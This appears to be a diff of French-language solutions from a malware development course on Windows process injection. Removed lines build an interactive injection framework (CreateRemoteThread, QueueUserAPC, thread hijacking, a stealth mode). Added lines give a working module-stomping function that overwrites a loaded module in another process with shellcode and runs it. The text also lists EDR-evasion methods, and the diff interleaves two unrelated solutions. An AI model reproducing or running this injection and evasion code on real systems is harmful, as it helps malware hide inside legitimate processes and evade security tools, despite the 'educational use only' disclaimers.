-- Monitoring de CreateRemoteThread
-- Analyse comportementale
-
-Pour aller plus loin (évasion EDR avancée) :
-- Utiliser des syscalls directs (bypass de hooks userland)
-- Module stomping (réutiliser des modules existants)
-- Process ghosting / Process doppelgänging
-- Reflective DLL injection
-
-═══════════════════════════════════════════════════════════════════════════
-
-SOLUTION EXERCICE 8 : Framework Complet d'Injection
-─────────────────────────────────────────────────────────────────────────────
-
-// Structure pour les techniques d'injection
-typedef BOOL (*InjectionFunc)(DWORD, void*, SIZE_T);
-
-typedef struct {
-    const char* name;
-    const char* description;
-    InjectionFunc func;
-} InjectionTechnique;
-
-// Shellcodes prédéfinis
-typedef struct {
-    const char* name;
-    unsigned char* data;
-    SIZE_T size;
-} Shellcode;
-
-// Framework principal
-typedef struct {
-    InjectionTechnique techniques[10];
-    int technique_count;
-    Shellcode shellcodes[5];
-    int shellcode_count;
-    BOOL stealth_mode;
-    BOOL verbose;
-} InjectionFramework;
-
-// Initialisation du framework
-void init_framework(InjectionFramework* fw) {
-    memset(fw, 0, sizeof(InjectionFramework));
-
-    // Enregistrer les techniques
-    fw->techniques[0] = (InjectionTechnique){
-        "CreateRemoteThread",
-        "Technique classique via création de thread distant",
-        inject_create_remote_thread
-    };
-
-    fw->techniques[1] = (InjectionTechnique){
-        "QueueUserAPC",
-        "Injection via APC (plus furtive)",
-        inject_queue_user_apc
-    };
-
-    fw->techniques[2] = (InjectionTechnique){
-        "Thread Hijacking",
-        "Détournement de thread existant",
-        inject_thread_hijacking
-    };
-
-    fw->technique_count = 3;
-
-    // Mode furtif désactivé par défaut
-    fw->stealth_mode = FALSE;
-    fw->verbose = TRUE;
-}
-
-// Menu principal
-void display_menu(InjectionFramework* fw) {
-    printf("\n╔═══════════════════════════════════════════════════════════════╗\n");
-    printf("║          FRAMEWORK D'INJECTION - MENU PRINCIPAL               ║\n");
-    printf("╚═══════════════════════════════════════════════════════════════╝\n\n");
-
-    printf("TECHNIQUES D'INJECTION DISPONIBLES:\n");
-    printf("─────────────────────────────────────────────────────────────────\n");
-    for (int i = 0; i < fw->technique_count; i++) {
-        printf("%d. %-25s - %s\n",
-               i + 1,
-               fw->techniques[i].name,
-               fw->techniques[i].description);
-    }
-
-    printf("\nOPTIONS:\n");
-    printf("─────────────────────────────────────────────────────────────────\n");
-    printf("s. Mode stealth (RW→RX): %s\n", fw->stealth_mode ? "ON" : "OFF");
-    printf("v. Logs verbeux: %s\n", fw->verbose ? "ON" : "OFF");
-    printf("q. Quitter\n");
-
-    printf("\n⚠️  RAPPEL: Usage éducatif uniquement!\n");
-}
-
-// Fonction principale du framework
-int run_framework(void) {
-    InjectionFramework fw;
-    init_framework(&fw);
-
-    char processName[256];
-    DWORD pid = 0;
-
-    printf("╔═══════════════════════════════════════════════════════════════╗\n");
-    printf("║        FRAMEWORK D'INJECTION DE PROCESSUS v1.0               ║\n");
-    printf("║              ⚠️  Usage éducatif uniquement ⚠️                  ║\n");
-    printf("╚═══════════════════════════════════════════════════════════════╝\n");
-
-    // Demander le processus cible
-    printf("\nProcessus cible (nom ou PID): ");
-    if (scanf("%s", processName) != 1) {
-        return 1;
-    }
-
-    // Déterminer si c'est un PID ou un nom
-    if (isdigit(processName[0])) {
-        pid = atoi(processName);
-        printf("[+] PID cible: %lu\n", pid);
-    } else {
-        pid = find_process_by_name(processName);
-        if (pid == 0) {
-            printf("[-] Processus '%s' non trouvé\n", processName);
-            return 1;
-        }
-    }
-
-    // Boucle principale
-    while (1) {
-        display_menu(&fw);
-
-        printf("\nChoix: ");
-        char choice[10];
-        if (scanf("%s", choice) != 1) {
-            continue;
-        }
-
-        // Gérer les options
-        if (choice[0] == 'q') {
-            printf("[*] Au revoir!\n");
+===============================================================================
+SOLUTION 3 : MODULE STOMPING
+===============================================================================
+
+BOOL stomp_module(DWORD pid, const char* module_name, LPVOID shellcode, SIZE_T size) {
+    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+
+    // Trouver module
+    HMODULE modules[1024];
+    DWORD needed;
+    EnumProcessModules(hProc, modules, sizeof(modules), &needed);
+
+    HMODULE target_module = NULL;
+    for (DWORD i = 0; i < needed / sizeof(HMODULE); i++) {
+        char name[MAX_PATH];
+        GetModuleBaseNameA(hProc, modules[i], name, sizeof(name));
+        if (strcmp(name, module_name) == 0) {
+            target_module = modules[i];
             break;
         }
-        else if (choice[0] == 's') {
-            fw.stealth_mode = !fw.stealth_mode;
-            printf("[+] Mode stealth: %s\n", fw.stealth_mode ? "ON" : "OFF");
-            continue;
-        }
-        else if (choice[0] == 'v') {
-            fw.verbose = !fw.verbose;
-            printf("[+] Logs verbeux: %s\n", fw.verbose ? "ON" : "OFF");
-            continue;
-        }
-
-        // Sélection de technique
-        int tech_idx = atoi(choice) - 1;
-        if (tech_idx < 0 || tech_idx >= fw.technique_count) {
-            printf("[-] Choix invalide\n");
-            continue;
-        }
-
-        printf("\n[*] Technique sélectionnée: %s\n",
-               fw.techniques[tech_idx].name);
-
-        if (fw.stealth_mode) {
-            printf("[*] Mode stealth activé (RW→RX)\n");
-        }
-
-        // Sélection du shellcode
-        printf("\nShellcodes disponibles:\n");
-        printf("1. MessageBox 'Injected!'\n");
-        printf("2. Calc.exe spawn\n");
-        printf("3. Custom (saisir)\n");
-        printf("Choix: ");
-
-        int sc_choice;
-        if (scanf("%d", &sc_choice) != 1) {
-            continue;
-        }
-
-        unsigned char* shellcode = NULL;
-        SIZE_T shellcode_size = 0;
-
-        switch (sc_choice) {
-            case 1:
-                shellcode = test_shellcode;  // MessageBox
-                shellcode_size = sizeof(test_shellcode);
-                break;
-            case 2:
-                // Shellcode WinExec("calc.exe", SW_SHOW)
-                printf("[*] Shellcode calc.exe\n");
-                // ... (shellcode calc à définir)
-                break;
-            case 3:
-                printf("[*] Mode custom non implémenté dans cette démo\n");
-                continue;
-            default:
-                printf("[-] Choix invalide\n");
-                continue;
-        }
-
-        // Exécuter l'injection
-        printf("\n[*] Lancement de l'injection...\n");
-
-        BOOL result;
-        if (fw.stealth_mode) {
-            result = inject_stealth_rwx(pid, shellcode, shellcode_size);
-        } else {
-            result = fw.techniques[tech_idx].func(pid, shellcode, shellcode_size);
-        }
-
-        if (result) {
-            printf("\n[✓] INJECTION RÉUSSIE!\n");
-        } else {
-            printf("\n[✗] Injection échouée\n");
-        }
-
-        printf("\nAppuyez sur Entrée pour continuer...");
-        getchar(); getchar();
     }
 
-    return 0;
+    if (!target_module) return FALSE;
+
+    // Change protection
+    DWORD old_protect;
+    VirtualProtectEx(hProc, target_module, size, PAGE_EXECUTE_READWRITE, &old_protect);
+
+    // Overwrite
+    WriteProcessMemory(hProc, target_module, shellcode, size, NULL);
+
+    // Restore (optional)
+    VirtualProtectEx(hProc, target_module, size, old_protect, &old_protect);
+
+    // Execute via CreateRemoteThread pointant vers module
+    CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)target_module,
+                      NULL, 0, NULL);
+
+    CloseHandle(hProc);
+    return TRUE;
 }
 
-int main(void) {
-    return run_framework();
-}
-
-Fonctionnalités du framework :
-- Menu interactif clair
-- Support de multiples techniques d'injection
-- Mode stealth (RW→RX) activable
-- Logs verbeux configurables
-- Sélection par nom de processus ou PID
-- Multiples shellcodes prédéfinis
-- Architecture extensible
-
-Extensions possibles :
-- Support de shellcode custom depuis fichier
-- Génération automatique de shellcode
-- Évasion EDR avancée (syscalls directs)
-- Support de Process Hollowing complet
-- Module stomping
-- Chiffrement de shellcode
-
-═══════════════════════════════════════════════════════════════════════════
-                            FIN DES SOLUTIONS
-═══════════════════════════════════════════════════════════════════════════
-
-RAPPEL FINAL :
-Ces techniques sont EXTRÊMEMENT sensibles et réglementées.
-Utilisez UNIQUEMENT dans un cadre légal et éthique.
-Environnements de test isolés (VM) OBLIGATOIRES.
-
-Pour aller plus loin :
-- Windows Internals (Russinovich & Solomon)
-- Malware analysis courses
-- Red team training certifié
-- Bug bounty programs légitimes
+Référence : Malware development course, MITRE ATT&CK T1055
